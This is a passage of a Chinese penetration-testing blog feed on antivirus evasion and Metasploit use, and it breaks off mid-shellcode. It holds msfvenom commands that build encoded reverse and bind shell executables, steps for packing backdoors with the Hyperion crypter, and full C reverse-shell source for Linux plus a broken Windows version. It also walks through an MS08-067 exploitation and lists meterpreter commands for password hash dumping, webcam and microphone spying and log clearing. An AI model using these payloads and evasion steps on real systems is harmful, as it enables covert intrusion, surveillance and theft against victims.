      
        &lt;blockquote&gt;
&lt;h3 id=&quot;Veil-catapult&quot;&gt;&lt;a href=&quot;#Veil-catapult&quot; class=&quot;headerlink&quot; title=&quot;Veil-catapult&quot;&gt;&lt;/a&gt;&lt;strong&gt;Veil-catapult&lt;/strong&gt;&lt;/h3
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
    
      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
    
      <category term="passing-the-hash" scheme="http://c.cat.plus/tags/passing-the-hash/"/>
    
      <category term="Veil-Framework" scheme="http://c.cat.plus/tags/Veil-Framework/"/>
    
      <category term="shellter" scheme="http://c.cat.plus/tags/shellter/"/>
    
      <category term="ghex" scheme="http://c.cat.plus/tags/ghex/"/>
    
  </entry>
  
  <entry>
    <title>Veil-evasion自动生成免杀后门</title>
    <link href="http://c.cat.plus/2016/08/05/Avoid_Killing/Veil-evasion%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E5%85%8D%E6%9D%80%E5%90%8E%E9%97%A8/"/>
    <id>http://c.cat.plus/2016/08/05/Avoid_Killing/Veil-evasion%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E5%85%8D%E6%9D%80%E5%90%8E%E9%97%A8/</id>
    <published>2016-08-05T12:11:02.000Z</published>
    <updated>2020-06-11T11:01:27.424Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="Veil-evasion"><a href="#Veil-evasion" class="headerlink" title="Veil-evasion"></a><strong>Veil-evasion</strong></h3></blockquote><ul><li><p>属于 Veil-Framework框架的一部分</p></li><li><p>由 Python 语言编写</p></li><li><p>用于自动生成免杀 payload</p></li><li><p>集成msf payload,支持自定义payload</p></li><li><p>集成各种注入技术</p></li><li><p>集成各种第三方工具</p><p>   <code>Hypersion</code> , <code>PEScrambler</code> , <code>BackDoor Factory</code></p></li><li><p>集成各种开发打包运行环境</p><p>   Python: pyinstaller / py2exe<br>   C#: mono for .NET<br>   C: mingw32<br>   ruby</p></li></ul><p><strong>kali安装使用Veil-evasion</strong></p><pre><code>apt-get install veil-evasionveil        #首次运行安装环境use 1        #使用 Evasionlist        #列出shellcode编号,最新3.1版本默认41个payloaduse 35        #选择使用35号python注入型shellcodeoptions        #查看payload选项set            #可以使用set对payload进行配置generate    #确认配置后生成payload</code></pre><h4 id="MSF利用payload"><a href="#MSF利用payload" class="headerlink" title="MSF利用payload"></a><strong>MSF利用payload</strong></h4><ul><li>使用Veil-evasion生成payload后会在本地路径 <code>/var/lib/veil/output/handlers</code> 下保存MSF的处理程序</li></ul><p><strong>使用MSF侦听连接</strong></p><pre><code>msfconsole -r cat35_handler.rc        #MSF使用Veil生成的配置文件jobssessions                    #运行木马后,查看连接会话sessions -i 1                #进入会话ID,获取交互shell</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;Veil-evasion&quot;&gt;&lt;a href=&quot;#Veil-evasion&quot; class=&quot;headerlink&quot; title=&quot;Veil-evasion&quot;&gt;&lt;/a&gt;&lt;strong&gt;Veil-evasion&lt;/strong&gt;&lt;/h3&gt;&lt;/b
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
    
      <category term="Veil-Framework" scheme="http://c.cat.plus/tags/Veil-Framework/"/>
    
      <category term="Hyperion" scheme="http://c.cat.plus/tags/Hyperion/"/>
    
      <category term="Veil-evasion" scheme="http://c.cat.plus/tags/Veil-evasion/"/>
    
  </entry>
  
  <entry>
    <title>msfvenom后门生成及Hyperion加密</title>
    <link href="http://c.cat.plus/2016/08/04/Avoid_Killing/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%8F%8AHyperion%E5%8A%A0%E5%AF%86/"/>
    <id>http://c.cat.plus/2016/08/04/Avoid_Killing/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%8F%8AHyperion%E5%8A%A0%E5%AF%86/</id>
    <published>2016-08-04T11:16:32.000Z</published>
    <updated>2020-06-10T09:08:37.452Z</updated>
    
    <content type="html"><![CDATA[<h4 id="生成反弹shell"><a href="#生成反弹shell" class="headerlink" title="生成反弹shell"></a><strong>生成反弹shell</strong></h4><pre><code>msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe</code></pre><p><strong>生成加密编码反弹shell</strong></p><pre><code>msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/ countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/ shikata_ga_nai -i 9 -b &apos;\x00&apos; -f exe -o a.exe</code></pre><ul><li>比较编码前后的检测率</li></ul><p><strong>查看文件md5值</strong></p><pre><code>md5sum *.exe</code></pre><p><strong>可读字符串查看</strong> 比较</p><pre><code>strings a.exestrings b.exe</code></pre><h4 id="利用模板隐藏shell"><a href="#利用模板隐藏shell" class="headerlink" title="利用模板隐藏shell"></a><strong>利用模板隐藏shell</strong></h4><pre><code>msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe#利用模板和加密生成msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe &gt; b.exe</code></pre><blockquote><h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a><strong>软件保护</strong></h4></blockquote><ul><li>软件开发商为保护版权,采用的混淆和加密技术避免盗版逆向</li><li>常被恶意软件用于免杀目的</li></ul><p><strong>Hyperion</strong> (32bit PE程序加密器)</p><ul><li>Crypter / Container    # 解密器 / PE Loader</li></ul><pre><code>#克隆github源码git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zipunzip Hyperion-1.2.zip#加上静态库文件进行编译cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe#安装wine32运行环境dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32#生成后门msfvenom -p windows/shell/reverse_tcp lhost=192.168.1.15 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o a.exe#使用Hyperion后门加壳wine h.exe a.exe b.exe</code></pre><p><strong>Windows reverse shell</strong></p><pre><code>wine gcc.exe windows.c -o windows.exe -lws2_32</code></pre><p><strong>Linux shell</strong></p><pre><code>gcc linux_revers_shell.c -o linux</code></pre><p><strong>linux_revers_shell.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sock</span>;</span></span><br><span class="line"><span class="keyword">int</span> s;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>); <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">sock.sin_family  = AF_INET;</span><br><span class="line">sock.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">sock.sin_addr.s_addr = inet_addr(argv[<span class="number">1</span>]);</span><br><span class="line">s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">connect</span>(s,(struct sockaddr_in *)&amp;sock, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line"></span><br><span class="line">dup2(s,<span class="number">0</span>);</span><br><span class="line">dup2(s,<span class="number">1</span>);</span><br><span class="line">dup2(s,<span class="number">2</span>);</span><br><span class="line">execl(<span class="string">"/bin/sh"</span>,<span class="string">"httpd"</span>,(<span class="keyword">char</span> *)<span class="number">0</span>); <span class="comment">//precess httpd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>windows.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 未修正错误</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"></span><br><span class="line">WSADATA wsaData;</span><br><span class="line">SOCKET Winsock;</span><br><span class="line">SOOKET Sock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hax</span>;</span></span><br><span class="line"><span class="keyword">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">STARTUPINFO ini_processo;</span><br><span class="line">PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"><span class="title">WSAStartup</span><span class="params">(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>), wsaData)</span></span>;</span><br><span class="line">winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>) </span><br><span class="line">&#123;<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>;) <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line">host = gethostbyname(argv [<span class="number">1</span>] );</span><br><span class="line"><span class="built_in">strcpy</span>(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">hax.sin_family = AF_INET;</span><br><span class="line">hax.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">WSAConnect(Winsock,(SOCKADDR* &amp;hax,<span class="keyword">sizeof</span>(hax),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">memset</span>(&amp;ini_processo,<span class="number">0</span>,<span class="keyword">sizeof</span>(ini_processo));</span><br><span class="line">ini_processo.cb = <span class="keyword">sizeof</span>(ini_processo);</span><br><span class="line">ini_processo.dwFlags = START_USESTDHANDLES;</span><br><span class="line">ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line">CreateProcess(<span class="literal">NULL</span>,<span class="string">"cmd exe"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,TRUE,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;ini_processo,&amp;process_info);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;生成反弹shell&quot;&gt;&lt;a href=&quot;#生成反弹shell&quot; class=&quot;headerlink&quot; title=&quot;生成反弹shell&quot;&gt;&lt;/a&gt;&lt;strong&gt;生成反弹shell&lt;/strong&gt;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;msfvenom -p windo
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="C" scheme="http://c.cat.plus/tags/C/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="Hyperion" scheme="http://c.cat.plus/tags/Hyperion/"/>
    
      <category term="strings" scheme="http://c.cat.plus/tags/strings/"/>
    
      <category term="gcc" scheme="http://c.cat.plus/tags/gcc/"/>
    
      <category term="wine" scheme="http://c.cat.plus/tags/wine/"/>
    
  </entry>
  
  <entry>
    <title>恶意程序及免杀技术现状</title>
    <link href="http://c.cat.plus/2016/08/03/Avoid_Killing/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%8F%8A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF%E7%8E%B0%E7%8A%B6/"/>
    <id>http://c.cat.plus/2016/08/03/Avoid_Killing/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%8F%8A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF%E7%8E%B0%E7%8A%B6/</id>
    <published>2016-08-03T09:15:31.000Z</published>
    <updated>2020-06-10T08:31:40.420Z</updated>
    
    <content type="html"><![CDATA[<h4 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a><strong>恶意软件</strong></h4><ul><li>病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序</li><li>在用户非自愿的情况下执行安装</li><li>出于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击…</li></ul><h4 id="防病毒软件"><a href="#防病毒软件" class="headerlink" title="防病毒软件"></a><strong>防病毒软件</strong></h4><ul><li><p>恶意程序最主要的防护手段</p><p>  杀毒软件/防病毒软件<br>  客户端/服务器/邮件防病毒</p></li><li><p>检测原理</p><p>  基于二进制文件中特种签名的黑名单检测方法<br>  于行为的分析方法(启发式)</p></li><li><p>事后手段</p><p>  永远落后于病毒发展</p></li></ul><h4 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a><strong>免杀技术</strong></h4><ul><li><p>修改二进制文件中的特征字符</p><p>  替换、擦除、修改</p></li><li><p>加密技术(crypter)</p><p>  通过加密使得特征字符不可读,从而逃避AV检测<br>  运行时分片分段的解密执行,注入进程或AV不检查的无害文件中</p></li><li><p>防病毒软件的检测</p><p>  恶意程序本身的特征字符<br>  加密器crypter的特征字符</p></li></ul><blockquote><h3 id="当前现状"><a href="#当前现状" class="headerlink" title="当前现状"></a><strong>当前现状</strong></h3></blockquote><p><strong>恶意软件制造者</strong></p><ul><li>编写私有RAT软件,避免普遍被AV所知的特征字符</li><li>使用独有crypter软件加密恶意程序</li><li>处事低调，尽量避免被发现</li><li>没有能力自己编写而已代码的黑客,通过直接修改特征码的方式免杀</li><li>Fully UnDetectable是最高追求(FUD)</li></ul><p><strong>AV厂商</strong></p><ul><li>广泛采集样本,尽快发现新出现的而已程序,更新病毒库</li><li>一般新的恶意软件安全UD窗口期是一周左右</li><li>与恶意软件制造者永无休止的拉锯战</li><li>新的启发式检测技术尚有待完善(误杀漏杀)</li></ul><p><strong>单一AV广商的病毒库很难达到100%覆盖</strong></p><ul><li><p><code>https://www.virustotal.com/</code><br>  接口被某些国家的AV软件免费利用，没有自己的病毒库</p></li><li><p><code>http://www.virscan.org/</code></p></li><li><p>在线多引擎查杀网站与AV厂商共享信息</p></li><li><p>搞黑的在线多引擎查毒站</p></li><li><p><code>https://nodistribute.com/</code></p></li><li><p><code>http://viruscheckmate.com/check/</code></p></li></ul><p><strong>常用RAT软件</strong></p><ul><li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li></ul><h4 id="NanoCore-Bate-Release"><a href="#NanoCore-Bate-Release" class="headerlink" title="NanoCore - Bate Release"></a><strong>NanoCore</strong> - Bate Release</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;恶意软件&quot;&gt;&lt;a href=&quot;#恶意软件&quot; class=&quot;headerlink&quot; title=&quot;恶意软件&quot;&gt;&lt;/a&gt;&lt;strong&gt;恶意软件&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序&lt;/li&gt;

      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="RAT" scheme="http://c.cat.plus/tags/RAT/"/>
    
      <category term="NanoCore" scheme="http://c.cat.plus/tags/NanoCore/"/>
    
      <category term="crypter" scheme="http://c.cat.plus/tags/crypter/"/>
    
  </entry>
  
  <entry>
    <title>meterpreter基本命令及其Python扩展</title>
    <link href="http://c.cat.plus/2016/03/06/MsF/meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%85%B6Python%E6%89%A9%E5%B1%95/"/>
    <id>http://c.cat.plus/2016/03/06/MsF/meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%85%B6Python%E6%89%A9%E5%B1%95/</id>
    <published>2016-03-06T13:19:23.000Z</published>
    <updated>2020-06-16T07:54:41.334Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a><strong>Meterpreter</strong></h4><p><strong>高级,动态,可扩展的payload</strong></p><ul><li>基于meterpreter上下文利用更多漏洞发起攻击</li><li>后渗透测试阶段一站式操作界面</li></ul><p><strong>完全基于内存的DLL注入式payload</strong> (不写硬盘)</p><ul><li>注入合法系统进程并建立stager</li><li>基于Stager上传和预加载DLL进行扩展模块的注入(客户端API)</li><li>基于Stager建立的socket连接建立加密的TLS/1.0通信隧道</li><li>利用TLS隧道进一步加载后续扩展模块(避免网络取证)</li></ul><p><strong>服务端使用C语言编写</strong></p><ul><li>客户端提供基于ruby的全特性API(支持任何语言)</li></ul><h4 id="meterpreter基本命令"><a href="#meterpreter基本命令" class="headerlink" title="meterpreter基本命令"></a><strong>meterpreter基本命令</strong></h4><p><strong>以ms08_067漏洞测试获取一个meterpreter会话</strong></p><pre><code>msfconsolesearch 08-067use exploit/windows/smb/ms08_067_netapishow optionsset rhost 192.168.254.113set target 34set paylaod windows/meterpreter/reverse_tcpset lhsot 192.168.254.118set lport 6666exploit -j sessions -i 1</code></pre><p><strong>基本命令</strong></p><pre><code>help / ?        #查看使用帮助    background        #将meterpreter终端隐藏在后台（快捷键ctrl+z）sessions        #查看已经成功获得的会话，如果想继续与某会话交互，可以使用sessions -i 命令.quit / exit        #直接关闭当前的meterpreter会话，返回MSF终端.run                #执行meterpreter模块或脚本run post/windows/gather/hashdump    #获取目标机器hash密码bgrun            #后台执行meterpreter模块或脚本bgrun vnc        #VNC远程监控bgrun service_manager -l     #查看目标系统已有服务,可以创建自启动或开启停止服务.bglist            #提供所有正在运行的后台脚本的列表bgkill             #杀死一个背景 meterpreter 脚本channel         #显示活动频道interact         #与通道进行交互write             #将数据写入到一个通道read             #从通道读取数据close             #关闭通道use             #加载 meterpreter 的扩展clearev            #清除目标系统日志shell            #获取目标系统的控制台shell.resource -r r.txt    #调用资源文件ldletime        #查看目标机器空闲时间,判断电脑前是否有人record_mic        #录制目标麦克风,窃取声音信息webcam_list     #列出摄像头设备webcam_snap -i 1 -v false    #使用摄像头监控irb                #在meterpreter会话与ruby终端交互.load            #加载扩展插件</code></pre><p><strong>文件系统命令</strong></p><pre><code>cd            #访问目标文件夹路径pwd            #查看目标当前路径#攻击者本机命令前加l,意为local本地lcd         #访问攻击者本机路径lpwd        #查看攻击者本机路径ls / dir    #查看目标文件列表.cat            #查看目标文件内容.mkdir        #在目标机器创建目录.mv            #移动文件或改名getwd        #获得目标机器上当前的工作目录，getlwd，这个命令可以获得当前系统的工作目录.upload        #可以上传文件或文件夹到目标机器上;upload 要上传的文件 C:\Users\buzz\Desktopdownload    #从目标机器上下载文件或文件夹，注意windows路径要用双斜杠进行转义. download C:\\test.txt /root/home/testedit        #调用vi编辑器，对目标机器上的文件进行编辑;edit c:\\windows\\system32\\drivers\\etc\\hostssearch        #可通过search -h查看帮助信息,参数-d指定搜索的起始目录或驱动，如果为空，将进行全盘搜索；参数-f指定搜索的文件或部分文件名，支持星号(*)匹配；参数-r递归搜索子目录.search -d c:\\windows -f *.txtrm / del    #删除目标机器的文件.rmdir /s/q c:\\test    #进入shell后使用此命令可以删除目录下的所有文件和文件夹，/s表示所有子目录和文件/q表示安静模式，不显示yes or no.</code></pre><p><strong>网络命令</strong></p><pre><code>arp            #查看APR缓存netstat        #查看网络连接情况ifconfig    #查看目标机器网络接口信息portfwd        #它是meterpreter自带的端口转发器，用于把目标机器的端口转发到本地端口；假设目标机开放了3389端口，使用如下命令将其转发到本地3456端口：portfwd add -l 3456 -p 3389 -r 192.168.88.110rdesktop -u 用户名 -p 密码 ip:端口          #连接开启远程桌面的windows系统.route        #显示目标机器的路由信息.</code></pre><p><strong>系统命令</strong></p><pre><code>ps            #用于获得目标主机上正在运行的进程信息.migrate pid    #将Meterpreter会话从一个进程迁移到另一个进程的内存空间中，可以配合ps -ef |grep explorer.exeexecute        #在目标机器上执行文件.    execute -H -i -f cmd.exe         #直接与cmd进行交互,参数-H 表示隐藏执行 -i 表示直接与cmd交互.#另外execute命令的-m参数支持直接从内存中执行攻击者的可执行文件.execute -H -m -d regedit.exe -f hidden_shell.exegetprivs    #查看获取的权限getproxy    #获取代理信息getsystem    #获取系统权限getpid        #获得当前会话所在进程的PID值.kill        #用于终结指定的PID进程.getuid        #用于获得运行meterpreter会话的用户名，从而查看当前会话具有的权限.sysinfo        #用于得到目标系统的一些信息，例如机器名，操作系统等.show_mount    #展示已挂载磁盘reboot        #重启目标机器shutdown    #关闭目标机器</code></pre><h4 id="Meterpreter-python扩展"><a href="#Meterpreter-python扩展" class="headerlink" title="Meterpreter python扩展"></a><strong>Meterpreter python扩展</strong></h4><ul><li>2015年11月份,来自社区的贡献</li><li>无需运行环境,在客户端运行原生python代码</li></ul><pre><code>load pythonhelppython_execute &quot;print(hello world)&quot;python_execute &quot;import os; cd=os.getcwd()&quot; -r cdpython_import -f find.py</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Meterpreter&quot;&gt;&lt;a href=&quot;#Meterpreter&quot; class=&quot;headerlink&quot; title=&quot;Meterpreter&quot;&gt;&lt;/a&gt;&lt;strong&gt;Meterpreter&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;高级,动态,可扩展
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
    
      <category term="meterpreter" scheme="http://c.cat.plus/tags/meterpreter/"/>
    
  </entry>
  
  <entry>
    <title>MSF生成和使用payload</title>
    <link href="http://c.cat.plus/2016/03/05/MsF/MSF%E7%94%9F%E6%88%90%E5%92%8C%E4%BD%BF%E7%94%A8payload/"/>
    <id>http://c.cat.plus/2016/03/05/MsF/MSF%E7%94%9F%E6%88%90%E5%92%8C%E4%BD%BF%E7%94%A8payload/</id>
    <published>2016-03-05T11:17:52.000Z</published>
    <updated>2020-06-16T07:57:20.878Z</updated>
    
    <content type="html"><![CDATA[<h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a><strong>生成payload</strong></h4><pre><code>msfconsoleuse payload/windows/shell_bind_tcp        #选择使用payload模块generate            #生成默认输出ruby语言shellcodegenerate -f c        #生成C语言的shellcodegenerate -f python    #生成python语言shellcodegenerate -f jav        #生成java语言shellcodegenerate -f exe        #生成为EXE可执行文件generate -h</code></pre><ul><li><p>默认输出为ruby语言16进制shellcode</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># windows/shell_bind_tcp - 328 bytes</span></span><br><span class="line"><span class="comment"># https://metasploit.com/</span></span><br><span class="line"><span class="comment"># VERBOSE=false, LPORT=4444, RHOST=, PrependMigrate=false, </span></span><br><span class="line"><span class="comment"># EXITFUNC=process, CreateSession=true</span></span><br><span class="line">buf = </span><br><span class="line"><span class="string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"</span> +</span><br><span class="line"><span 